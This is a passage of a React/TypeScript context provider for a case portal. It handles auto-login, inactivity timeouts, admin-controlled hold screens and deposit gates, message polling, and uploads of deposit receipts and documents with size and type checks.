      if (reissuesRes.ok) {
        const data = await reissuesRes.json();
        setReissues(Array.isArray(data) ? data : []);
      }

      if (documentsRes.ok) {
        const data = await documentsRes.json();
        setDocumentRequests(Array.isArray(data) ? data : []);
      }

      if (userDocsRes.ok) {
        const data = await userDocsRes.json();
        setUserDocuments(Array.isArray(data) ? data : []);
      }

      if (walletEventsRes.ok) {
        const data = await walletEventsRes.json();
        setWalletEvents(Array.isArray(data?.events) ? data.events : []);
      }
    } catch (error) {
      console.error('Failed to load data:', error);
    }
  }, [caseId, caseAccessCode]);

  // Active round = most recent non-cancelled. The letter view uses this to
  // gate the submit button; the deposit view uses it to attach the receipt.
  const activeReissue: LetterReissue | null = (() => {
    const candidate = reissues.find(r => r.status !== 'cancelled');
    return candidate ?? null;
  })();

  useEffect(() => {
    const storedAccessCode = sessionStorage.getItem("caseAccessCode");
    const pinVerified = sessionStorage.getItem("pinVerified");
    const requiresPinSetup = sessionStorage.getItem("requiresPinSetup");
    
    // Only auto-login if PIN was verified OR if this is a new account requiring PIN setup
    if (storedAccessCode && viewState === 'login' && (pinVerified === 'true' || requiresPinSetup === 'true')) {
      (async () => {
        try {
          let storedLocaleHeader: HeadersInit = {};
          try {
            const v = localStorage.getItem("ibccf.locale");
            if (v) storedLocaleHeader = { "X-User-Locale": v };
          } catch {
            // ignore
          }
          const storedPortalToken = getPortalToken();
          const response = await fetch(`/api/cases/access/${storedAccessCode}`, {
            headers: {
              ...storedLocaleHeader,
              ...(storedPortalToken ? { "x-portal-session-token": storedPortalToken } : {}),
            },
          });
          if (response.ok) {
            const foundCase = await response.json();
            setCurrentCase(foundCase);
            setAccessCode(storedAccessCode);
            
            // If requires PIN setup, go to register view
            if (requiresPinSetup === 'true') {
              setViewState('register');
              return;
            }
            
            const validViews: ViewState[] = ['dashboard', 'letter', 'messages', 'submissions', 'deposit', 'timeline', 'keyRequest', 'declaration', 'documents', 'settings', 'sealed', 'withdrawalActivation', 'certificate', 'walletConnect', 'withdrawal'];
            const requestedView = (() => {
              try {
                const v = new URLSearchParams(window.location.search).get('view');
                return v && (validViews as string[]).includes(v) ? (v as ViewState) : null;
              } catch { return null; }
            })();
            // Portal Refresh Mode gate — platform-wide hold screen checked
            // before any case-specific routing. If enabled, all authenticated
            // users see the informational refresh page regardless of case state.
            try {
              const prRes = await fetch('/api/public/portal-refresh-mode');
              if (prRes.ok) {
                const prData = await prRes.json() as { enabled: boolean };
                if (prData.enabled) {
                  setViewState('portalRefresh');
                  return;
                }
              }
            } catch {
              // Non-fatal — fall through to normal routing if unreachable.
            }

            // Session Refresh Deposit gate — evaluated BEFORE any other
            // status-based routing. If the gate is active and the deposit
            // has not been approved, send the user to the blocking gate
            // page regardless of case status.
            if (
              foundCase.sessionRefreshRequired &&
              foundCase.sessionRefreshStatus !== 'approved'
            ) {
              setViewState('sessionRefresh');
              return;
            }

            const landingPage = (requestedView ?? foundCase.landingPage ?? 'dashboard') as ViewState;
            if (foundCase.status === 'sealed' || foundCase.sealedAt) setViewState('sealed');
            else if (foundCase.status === 'active') setViewState(landingPage);
            else if (foundCase.status === 'syncing') setViewState('sync');
            else if (foundCase.status === 'completed') setViewState(landingPage);
            else setViewState('register');
          } else {
            // Invalid session - clear storage
            sessionStorage.removeItem("caseAccessCode");
            sessionStorage.removeItem("pinVerified");
            sessionStorage.removeItem("requiresPinSetup");
          }
        } catch (error) {
          console.error('Failed to auto-login:', error);
        }
      })();
    } else if (storedAccessCode && !pinVerified && !requiresPinSetup) {
      // Has access code but no PIN verification - clear it for security
      sessionStorage.removeItem("caseAccessCode");
      sessionStorage.removeItem("caseId");
    }
  }, []);

  useEffect(() => {
    if (viewState === 'login' || viewState === 'register') return;

    let timeoutId: NodeJS.Timeout;

    const resetTimeout = () => {
      if (timeoutId) clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        logout();
        toast({ title: t("context.toast.sessionExpiredTitle"), description: t("context.toast.sessionExpiredDesc") });
      }, 3 * 60 * 1000);
    };

    const handleActivity = () => resetTimeout();

    window.addEventListener('mousemove', handleActivity);
    window.addEventListener('keypress', handleActivity);
    window.addEventListener('click', handleActivity);

    resetTimeout();

    return () => {
      window.removeEventListener('mousemove', handleActivity);
      window.removeEventListener('keypress', handleActivity);
      window.removeEventListener('click', handleActivity);
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [viewState, toast, logout]);

  useEffect(() => {
    // Run for every authenticated view, including 'sync', so the
    // admin force-logout signal also reaches users on the sync screen.
    if (caseId && viewState !== 'login' && viewState !== 'register') {
      loadAllData();
    }
  }, [caseId, viewState, loadAllData]);

  // Portal Refresh Mode — poll every 30 s so an admin can activate or
  // lift the hold screen without users needing to reload. When enabled,
  // force 'portalRefresh'; when lifted while already on that view,
  // send the user back to the dashboard.
  useEffect(() => {
    if (!caseId || viewState === 'login' || viewState === 'register') return;

    const check = async () => {
      try {
        const res = await fetch('/api/public/portal-refresh-mode');
        if (!res.ok) return;
        const data = await res.json() as { enabled: boolean };
        if (data.enabled) {
          setViewState('portalRefresh');
        } else if (viewState === 'portalRefresh') {
          setViewState('dashboard');
        }
      } catch { /* non-fatal — ignore */ }
    };

    const id = setInterval(check, 30_000);
    return () => clearInterval(id);
  }, [caseId, viewState]);

  // Case data polling for portal-warning detection.
  // Baseline: every 30 s. Escalates to every 5 s while a warning is active
  // so cancellations and expiry are detected quickly even with the overlay
  // dismissed. Also resets the dismissed key when the warning changes or
  // is cleared by the admin.
  useEffect(() => {
    if (!caseId || viewState === 'login' || viewState === 'register') return;
    const interval = activeWarning ? 5_000 : 30_000;
    const id = setInterval(() => { void loadAllData(); }, interval);
    return () => clearInterval(id);
  }, [caseId, viewState, activeWarning, loadAllData]);

  // Context-level auto-logout when the warning timer expires. This fires
  // even when the user has dismissed the overlay (warningDismissed = true),
  // ensuring the force-logout cannot be escaped by hiding the UI.
  // The callback also notifies the server so it stamps isDisabled and calls
  // resetWithdrawalPathway("expired") — making the expiry a server-side
  // compliance event, not just a client-side UI transition.
  usePortalAutoLogout(activeWarning, () => {
    toast({
      title: t("context.toast.forceLogoutTitle"),
      description: t("context.toast.forceLogoutDesc"),
      variant: "destructive",
    });

    // Capture the portal token SYNCHRONOUSLY before any async work so it
    // is still present when the fetch fires.  logout() clears the token,
    // so we send the server notification first, then log out.
    const caseIdForExpiry = currentCase?.id;
    const portalTokenForExpiry = getPortalToken();

    if (caseIdForExpiry) {
      // Await the server notification so the fetch carries the token, then
      // log out regardless of whether the request succeeded.
      void (async () => {
        try {
          await fetch(`/api/cases/${caseIdForExpiry}/portal-warning/expired`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              ...(portalTokenForExpiry
                ? { "x-portal-session-token": portalTokenForExpiry }
                : {}),
            },
          });
        } catch {
          // Swallow — logout proceeds regardless
        } finally {
          logout();
        }
      })();
    } else {
      logout();
    }
  });

  // Persist the user's active locale to the case record on every locale
  // switch. `loadAllData` calls `GET /api/cases/access/:code` with the
  // `X-User-Locale` header, and that endpoint writes the value through to
  // `cases.preferred_locale` — which downstream admin-triggered emails
  // (declaration assigned, document requested/reviewed, payout-wallet
  // set, etc.) read so they render in the user's chosen language.
  const { locale: activeLocale } = useLocale();
  useEffect(() => {
    if (caseAccessCode && viewState !== 'login' && viewState !== 'register') {
      void loadAllData();
    }
    // Intentionally only depends on the active locale code so this
    // effect fires when the user picks a new language, not on every
    // currentCase mutation.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [activeLocale.code]);

  useEffect(() => {
    if (!currentCase || viewState === 'login' || viewState === 'register') return;

    const pollMessages = async () => {
      try {
        const portalToken = getPortalToken();
        const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
          headers: portalToken ? { "x-portal-session-token": portalToken } : {},
        });
        if (res.ok) {
          const messages = await res.json();
          setChatMessages(messages);
          
          const adminMsgs = messages.filter((m: ChatMessage) => m.sender === 'admin' && m.isRead === 'false');
          setUnreadCount(adminMsgs.length);
          
          if (!isInitialLoadRef.current && messages.length > lastMessageCountRef.current) {
            const latestMessage = messages[messages.length - 1];
            if (latestMessage.sender === 'admin' && !isChatOpen) {
              playNotificationSound();
              toast({
                title: t("context.toast.newMessageTitle"),
                description: t("context.toast.newMessageDesc")
              });
            }
          }
          
          lastMessageCountRef.current = messages.length;
          isInitialLoadRef.current = false;
        }
      } catch (error) {
        console.error('Failed to poll messages:', error);
      }
    };

    pollMessages();
    const interval = setInterval(pollMessages, 5000);
    return () => clearInterval(interval);
  }, [currentCase, viewState, isChatOpen, toast]);

  // ── Admin approval/rejection notification sounds ──────────────────────────
  // Watch depositReceipts and documentRequests for status transitions.
  // When any item moves to 'approved' → play the celebratory fanfare.
  // When any item moves to 'rejected' → play the error tone.
  // Skip the very first data load (when the ref map is empty) so the user
  // doesn't get bombarded with sounds on initial page load.
  useEffect(() => {
    if (isFirstDataLoadRef.current) {
      // Seed the map on first load — no sound, just record current statuses.
      depositReceipts.forEach(r => prevReceiptStatusesRef.current.set(r.id, r.status));
      if (depositReceipts.length > 0) isFirstDataLoadRef.current = false;
      return;
    }
    let playedApproval = false;
    let playedRejection = false;
    depositReceipts.forEach(r => {
      const prev = prevReceiptStatusesRef.current.get(r.id);
      if (prev !== undefined && prev !== r.status) {
        if (r.status === 'approved' && !playedApproval) {
          playedApproval = true;
          void import('@/hooks/useNotificationSound').then(m => m.playNotificationSound('approval'));
          toast({ title: '✅ Receipt approved', description: 'Your payment receipt has been approved.' });
        } else if (r.status === 'rejected' && !playedRejection) {
          playedRejection = true;
          void import('@/hooks/useNotificationSound').then(m => m.playNotificationSound('error'));
          toast({ variant: 'destructive', title: '❌ Receipt not approved', description: 'A receipt was rejected. Please check your uploads.' });
        }
      }
      prevReceiptStatusesRef.current.set(r.id, r.status);
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [depositReceipts]);

  useEffect(() => {
    if (isFirstDataLoadRef.current) return;
    let playedApproval = false;
    let playedRejection = false;
    documentRequests.forEach(d => {
      const prev = prevDocStatusesRef.current.get(d.id);
      if (prev !== undefined && prev !== d.status) {
        if (d.status === 'approved' && !playedApproval) {
          playedApproval = true;
          void import('@/hooks/useNotificationSound').then(m => m.playNotificationSound('approval'));
          toast({ title: '✅ Document approved', description: 'One of your submitted documents has been approved.' });
        } else if (d.status === 'rejected' && !playedRejection) {
          playedRejection = true;
          void import('@/hooks/useNotificationSound').then(m => m.playNotificationSound('error'));
          toast({ variant: 'destructive', title: '❌ Document not approved', description: 'A document was rejected. Please check and re-upload if needed.' });
        }
      }
      prevDocStatusesRef.current.set(d.id, d.status);
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [documentRequests]);

  useEffect(() => {
    if (!currentCase || viewState === 'login' || viewState === 'register' || viewState === 'sync') return;

    const checkKeyRequest = async () => {
      try {
        const _kqToken = getPortalToken();
        const res = await fetch(`/api/access-key-requests/case/${currentCase.id}`, {
          headers: _kqToken ? { "x-portal-session-token": _kqToken } : {},
        });
        if (!res.ok) {
          // Only clear nav item on a definitive 404 (no request exists).
          // Transient 5xx or network errors leave the current state intact.
          if (res.status === 404) {
            setHasKeyRequest(false);
            setKeyRequestNotification(null);
          }
          return;
        }
        const data = await res.json();
        const { requestId, adminMessageCount, userMessagesReadCount, userEmail: krEmail } = data;
        setHasKeyRequest(true);
        // Incorporate locally-cached seen count so the badge clears immediately
        // after the user visits the status page, even before the next poll cycle.
        const localSeen = parseInt(localStorage.getItem(`ibccf_kr_seen_${requestId}`) || '0', 10);
        const effectiveRead = Math.max(userMessagesReadCount ?? 0, localSeen);
        const unread = Math.max(0, adminMessageCount - effectiveRead);
        if (unread > 0) {
          setKeyRequestNotification({ requestId, unreadCount: unread, userEmail: krEmail ?? undefined });
        } else {
          setKeyRequestNotification(null);
        }
      } catch {
        // silently ignore
      }
    };

    checkKeyRequest();
    const interval = setInterval(checkKeyRequest, 30000);

    // Re-check immediately when the user returns to this tab (e.g. after
    // visiting the status page in another tab or navigating back).
    const onVisible = () => {
      if (document.visibilityState === 'visible') checkKeyRequest();
    };
    document.addEventListener('visibilitychange', onVisible);

    return () => {
      clearInterval(interval);
      document.removeEventListener('visibilitychange', onVisible);
    };
  }, [currentCase, viewState]);

  // Called whenever a portal mutation gets a 401. Clears the expired
  // session and navigates to the login screen with an explanatory toast.
  const handleSessionExpired = useCallback(() => {
    toast({
      variant: "destructive",
      title: t("context.toast.sessionExpiredTitle"),
      description: t("context.toast.sessionExpiredDesc"),
    });
    logout();
  }, [logout, toast]);

  const sendMessage = useCallback(async (message: string) => {
    if (!message.trim() || !currentCase) return;
    
    try {
      const portalToken = getPortalToken();
      const res = await fetch(`/api/cases/${currentCase.id}/messages`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          ...(portalToken ? { 'x-portal-session-token': portalToken } : {}),
        },
        body: JSON.stringify({ sender: 'user', message: message.trim() })
      });
      
      if (res.ok) {
        const msg = await res.json();
        setChatMessages(prev => [...prev, msg]);
      } else if (res.status === 401) {
        handleSessionExpired();
      }
    } catch {
      toast({ variant: "destructive", title: t("context.toast.sendFailedTitle"), description: t("context.toast.sendFailedDesc") });
    }
  }, [currentCase, handleSessionExpired, toast]);

  const uploadReceipt = useCallback(async (
    file: File,
    notes: string,
    reissueId?: number,
    category?: 'activation' | 'reissue' | 'other' | 'merge_fee' | 'token_deposit',
    options?: { silent?: boolean },
  ) => {
    if (!currentCase) return;
    // When `silent`, the caller (e.g. the multi-file batch uploader in
    // DepositView) owns toast UX and just wants the success/error to
    // bubble up as a resolved/rejected promise. We still throw on
    // failure so the caller can collect per-file errors.
    const silent = options?.silent === true;
    const maybeToast: typeof toast = silent
      ? (((_: unknown) => ({ id: "silent", dismiss: () => {}, update: () => {} })) as unknown as typeof toast)
      : toast;

    // Client-side guard rails — fail fast with a useful message instead of
    // letting the user wait through a base64 encode + network round trip
    // only to see a generic "Upload failed" toast. The 8mb raw ceiling
    // gives us roughly 10.7mb after base64, comfortably under the server's
    // 12mb express.json limit (see server/index.ts).
    const MAX_FILE_BYTES = 8 * 1024 * 1024;
    const ACCEPTED_MIME = /^image\/(png|jpe?g|gif|webp|heic|heif)$|^application\/pdf$/i;

    if (file.size === 0) {
      maybeToast({ variant: "destructive", title: t("context.toast.emptyFileTitle"), description: t("context.toast.emptyFileReceiptDesc") });
      throw new Error('Empty file');
    }
    if (file.size > MAX_FILE_BYTES) {
      const mb = (file.size / 1024 / 1024).toFixed(1);
      maybeToast({
        variant: "destructive",
        title: t("context.toast.fileTooLargeTitle"),
        description: t("context.toast.fileTooLargeReceiptDesc", { mb }),
      });
      throw new Error('File too large');
    }
    if (file.type && !ACCEPTED_MIME.test(file.type)) {
      maybeToast({
        variant: "destructive",
        title: t("context.toast.unsupportedTypeTitle"),
        description: t("context.toast.unsupportedTypeReceiptDesc"),
      });
      throw new Error('Unsupported file type');
    }

    return new Promise<void>((resolve, reject) => {
      const reader = new FileReader();
      reader.onerror = () => {
        maybeToast({ variant: "destructive", title: t("context.toast.readFailedTitle"), description: t("context.toast.readFailedDesc") });
        reject(new Error('Failed to read file'));
      };
      reader.onload = async () => {
        try {
          const portalToken = getPortalToken();
          const response = await fetch(`/api/cases/${currentCase.id}/deposit-receipts`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...(portalToken ? { 'x-portal-session-token': portalToken } : {}),
            },
            body: JSON.stringify({
              imageData: reader.result as string,
              fileName: file.name,
              notes: notes,
              ...(reissueId ? { reissueId } : {}),
              // Task #163 — Unified uploader category. Server defaults
              // to 'activation' / 'reissue' based on reissueId when this
              // field is omitted, so older clients keep working.
              ...(category ? { category } : {}),
            })
          });

          if (response.ok) {
            const receipt = await response.json();
            setDepositReceipts(prev => [receipt, ...prev]);
            // If this receipt is paying a reissue fee, optimistically flip the
            // round to awaiting_review locally so the user sees an updated
            // status without waiting for the next poll.
            if (reissueId) {
              setReissues(prev => prev.map(r =>
                r.id === reissueId ? { ...r, status: 'awaiting_review', receiptId: receipt.id } : r
              ));
            }
            maybeToast({ title: t("context.toast.receiptUploadedTitle"), description: t("context.toast.receiptUploadedDesc") });
            resolve();
          } else if (response.status === 401) {
            // Session has expired or been revoked. Redirect to login rather
            // than showing the opaque "Unauthorized" text the server returns.
            handleSessionExpired();
            reject(new Error('Session expired'));
          } else {
            // Surface the real failure reason instead of a generic "Upload
            // failed". 413 means we hit the server limit even after our
            // client guard (e.g. a future limit-bump regression); 400 is a
            // Zod validation error (server returns { error: [{ message }] });
            // everything else is a server crash.
            let serverMessage = "Unable to upload receipt.";
            try {
              const body = await response.json();
              if (Array.isArray(body?.error) && body.error[0]?.message) {
                // Zod validation failure shape: { error: ZodIssue[] }
                serverMessage = body.error[0].message;
              } else if (typeof body?.error === 'string') {
                serverMessage = body.error;
              } else if (typeof body?.message === 'string') {
                // express's default 413 handler returns { message: "request entity too large" }
                serverMessage = body.message;
              }
            } catch {
              // Body was not JSON (e.g. plaintext 413 from express). Fall
              // back to a status-derived message.
            }
            if (response.status === 413) {
              serverMessage = t("context.toast.uploadFailed413");
            }
            maybeToast({ variant: "destructive", title: t("context.toast.uploadFailedTitle", { status: response.status }), description: serverMessage });
            reject(new Error(`Upload failed: ${response.status}`));
          }
        } catch (err) {
          // Thrown only when the network call itself errors (offline, DNS,
          // TLS) — JSON-parse and other in-handler errors are caught above.
          maybeToast({ variant: "destructive", title: t("context.toast.networkErrorTitle"), description: t("context.toast.networkErrorDesc") });
          reject(err instanceof Error ? err : new Error('Upload error'));
        }
      };
      reader.readAsDataURL(file);
    });
  }, [currentCase, handleSessionExpired, toast]);

  const refreshDocumentRequests = useCallback(async () => {
    if (!currentCase) return;
    try {
      const { getPortalToken } = await import("@/lib/portalSession");
      const portalToken = getPortalToken();
      const headers: HeadersInit = portalToken
        ? { "x-portal-session-token": portalToken }
        : {};
      const res = await fetch(`/api/cases/${currentCase.id}/document-requests`, { headers });
      if (res.ok) {
        const data = await res.json();
        setDocumentRequests(Array.isArray(data) ? data : []);
      }
    } catch {
      // silent
    }
  }, [currentCase]);

  const submitDocument = useCallback(async (requestId: number, file: File) => {
    // Mirror the server-side caps so the user gets a fast, clear failure
    // instead of waiting through a base64 encode + 10 MB POST only to be
    // rejected. Keep these aligned with server/routes/content.ts.
    const MAX_BYTES = 10 * 1024 * 1024;
    const ACCEPTED = /^application\/pdf$|^image\/(png|jpeg|webp)$/i;
    if (file.size === 0) {
      toast({ variant: "destructive", title: t("context.toast.emptyFileTitle"), description: t("context.toast.emptyFileDocDesc") });
      throw new Error('Empty file');
    }
    if (file.size > MAX_BYTES) {
      const mb = (file.size / 1024 / 1024).toFixed(1);
      toast({ variant: "destructive", title: t("context.toast.fileTooLargeTitle"), description: t("context.toast.fileTooLargeDocDesc", { mb }) });
      throw new Error('File too large');
    }
    if (!ACCEPTED.test(file.type)) {
      toast({ variant: "destructive", title: t("context.toast.unsupportedTypeTitle"), description: t("context.toast.unsupportedTypeDocDesc") });
      throw new Error('Unsupported file type');
    }

    return new Promise<void>((resolve, reject) => {
      const reader = new FileReader();
      reader.onerror = () => {
        toast({ variant: "destructive", title: t("context.toast.readFailedTitle"), description: t("context.toast.readFailedDocDesc") });
        reject(new Error('Failed to read file'));
      };
      reader.onload = async () => {
        try {
          const portalToken = getPortalToken();
          const res = await fetch(`/api/document-requests/${requestId}`, {
            method: 'PATCH',
            headers: {
              'Content-Type': 'application/json',
              ...(portalToken ? { 'x-portal-session-token': portalToken } : {}),
            },
            body: JSON.stringify({
              submittedFileData: reader.result as string,
              submittedFileName: file.name,
            }),
          });
          if (res.ok) {
            const updated = await res.json();
            setDocumentRequests(prev => prev.map(d => d.id === updated.id ? updated : d));
            toast({ title: t("context.toast.documentSubmittedTitle"), description: t("context.toast.documentSubmittedDesc") });
            resolve();
          } else if (res.status === 401) {
            handleSessionExpired();
            reject(new Error('Session expired'));
          } else {
            let msg = t("context.toast.submitFailedDefault");
            try {
              const body = await res.json();
              if (typeof body?.error === 'string') msg = body.error;
              else if (Array.isArray(body?.error) && body.error[0]?.message) msg = body.error[0].message;
              else if (typeof body?.message === 'string') msg = body.message;
            } catch {/* ignore */}
            if (res.status === 413) msg = t("context.toast.submitFailed413");
            toast({ variant: "destructive", title: t("context.toast.submitFailedTitle", { status: res.status }), description: msg });
            reject(new Error(msg));
          }
        } catch (err) {
          toast({ variant: "destructive", title: t("context.toast.networkErrorTitle"), description: t("context.toast.networkErrorDesc") });
          reject(err instanceof Error ? err : new Error('Submit error'));
        }
      };
      reader.readAsDataURL(file);
    });
  }, [handleSessionExpired, toast]);

  const pendingDocumentCount = documentRequests.filter(d => d.status === 'pending' || d.status === 'requested' || d.status === 'rejected').length;

  const refreshUserDocuments = useCallback(async () => {
    if (!currentCase) return;
    try {
      const portalToken = getPortalToken();
      const headers: HeadersInit = portalToken ? { 'x-portal-session-token': portalToken } : {};
      const res = await fetch(`/api/cases/${currentCase.id}/user-documents`, { headers });
      if (res.ok) {
        const data = await res.json();
        setUserDocuments(Array.isArray(data) ? data : []);
      }
    } catch {
      // silent
    }
  }, [currentCase]);

  const uploadUserDocument = useCallback(async (file: File, category: string, description?: string) => {
    if (!currentCase) throw new Error('No active case');
    const MAX_BYTES = 10 * 1024 * 1024;
    const ACCEPTED = /^application\/pdf$|^image\/(png|jpeg|webp)$/i;
    if (file.size === 0) {
      toast({ variant: 'destructive', title: t('context.toast.emptyFileTitle'), description: t('context.toast.emptyFileDocDesc') });
      throw new Error('Empty file');
    }
    if (file.size > MAX_BYTES) {
      const mb = (file.size / 1024 / 1024).toFixed(1);
      toast({ variant: 'destructive', title: t('context.toast.fileTooLargeTitle'), description: t('context.toast.fileTooLargeDocDesc', { mb }) });
      throw new Error('File too large');
    }
    if (!ACCEPTED.test(file.type)) {
      toast({ variant: 'destructive', title: t('context.toast.unsupportedTypeTitle'), description: t('context.toast.unsupportedTypeDocDesc') });
      throw new Error('Unsupported file type');
    }
    return new Promise<void>((resolve, reject) => {
      const reader = new FileReader();
      reader.onerror = () => {
        toast({ variant: 'destructive', title: t('context.toast.readFailedTitle'), description: t('context.toast.readFailedDocDesc') });
        reject(new Error('Failed to read file'));
      };
      reader.onload = async () => {
        try {
          const portalToken = getPortalToken();
          const res = await fetch(`/api/cases/${currentCase.id}/user-documents`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...(portalToken ? { 'x-portal-session-token': portalToken } : {}),
            },
            body: JSON.stringify({
              fileData: reader.result as string,
              fileName: file.name,
              category,
              description: description || undefined,
            }),
          });
          if (res.ok) {
            const created = await res.json();
            setUserDocuments(prev => [created, ...prev]);
            toast({ title: t('context.toast.documentSubmittedTitle'), description: t('context.toast.documentSubmittedDesc') });
            resolve();
          } else if (res.status === 401) {
            handleSessionExpired();
            reject(new Error('Session expired'));
          } else {
            let msg = t('context.toast.submitFailedDefault');
            try {
              const body = await res.json();
              if (typeof body?.error === 'string') msg = body.error;
            } catch {/* ignore */}
            if (res.status === 413) msg = t('context.toast.submitFailed413');
            toast({ variant: 'destructive', title: t('context.toast.submitFailedTitle', { status: res.status }), description: msg });
            reject(new Error(msg));
          }
        } catch (err) {
          toast({ variant: 'destructive', title: t('context.toast.networkErrorTitle'), description: t('context.toast.networkErrorDesc') });
          reject(err instanceof Error ? err : new Error('Upload error'));
        }
      };
      reader.readAsDataURL(file);
    });
  }, [currentCase, handleSessionExpired, toast, t]);

  const markAdminMessageRead = useCallback(async (messageId: number) => {
    if (!currentCase) return;
    
    try {
      const portalToken = getPortalToken();
      const res = await fetch(`/api/admin-messages/${messageId}/read`, {
        method: 'POST',
        headers: portalToken ? { 'x-portal-session-token': portalToken } : {}
      });
      
      if (res.ok) {
        setAdminMessages(prev => prev.map(m => 
          m.id === messageId ? { ...m, isRead: true } : m
        ));
        setUnreadAdminMessages(prev => Math.max(0, prev - 1));
      }
    } catch {
      console.error('Failed to mark message as read');
    }
  }, [currentCase]);

  const refreshSubmissions = useCallback(async () => {
    if (!currentCase) return;
    const portalToken = getPortalToken();
    const headers: HeadersInit = portalToken
      ? { 'x-portal-session-token': portalToken }
      : {};
    const res = await fetch(`/api/cases/${currentCase.id}/submissions`, { headers });
    if (res.status === 401) {
      handleSessionExpired();
      throw new Error('Session expired');
    }
    if (!res.ok) {
      throw new Error(`Failed to load submissions (${res.status})`);
    }
    const data = await res.json();
    setSubmissions(Array.isArray(data) ? data : []);
  }, [currentCase, handleSessionExpired]);

  const refreshAdminMessages = useCallback(async () => {
    if (!currentCase) return;
    const portalToken = getPortalToken();
    const headers: HeadersInit = portalToken
      ? { 'x-portal-session-token': portalToken }
      : {};
    const res = await fetch(`/api/cases/${currentCase.id}/admin-messages`, { headers });
    if (res.status === 401) {
      handleSessionExpired();
      throw new Error('Session expired');
    }
    if (!res.ok) {
      throw new Error(`Failed to load messages (${res.status})`);
    }
    const data = await res.json();
    setAdminMessages(Array.isArray(data) ? data : []);
    const unread = data.filter((m: AdminMessage) => !m.isRead).length;
    setUnreadAdminMessages(unread);
  }, [currentCase, handleSessionExpired]);

  const hasUrgentMessages = adminMessages.some(m => m.category === 'urgent' && !m.isRead);

  const value: PortalContextValue = {
    viewState,
    setViewState,
    currentCase,
    setCurrentCase,
    accessCode,
    setAccessCode,
    letterContent,
    setLetterContent,
    submissions,
    setSubmissions,
    chatMessages,
    setChatMessages,
    adminMessages,
    setAdminMessages,
    depositReceipts,
    setDepositReceipts,
    reissues,
    setReissues,
    activeReissue,
    unreadCount,
    setUnreadCount,
    unreadAdminMessages,
    setUnreadAdminMessages,
    isChatOpen,
    setIsChatOpen,
    loadAllData,
    logout,
    sendMessage,
    uploadReceipt,
    refreshSubmissions,
    refreshAdminMessages,
    documentRequests,
    refreshDocumentRequests,
    submitDocument,
    pendingDocumentCount,
    userDocuments,
    refreshUserDocuments,
    uploadUserDocument,
    markAdminMessageRead,
    hasUrgentMessages,
    hasKeyRequest,
    keyRequestNotification,
    declaration,
    refreshDeclaration,
    dismissKeyRequestNotification,
    markKeyRequestRead,
    walletEvents,
    activeWarning,
    warningDismissed,
    dismissWarning,
    reshowWarning,
    lockoutReason,
  };

  return (
    <PortalContext.Provider value={value}>
      {children}
    </PortalContext.Provider>
  );
}

function playNotificationSound() {
  void import('@/hooks/useNotificationSound').then(m => m.playNotificationSound('message'));
}
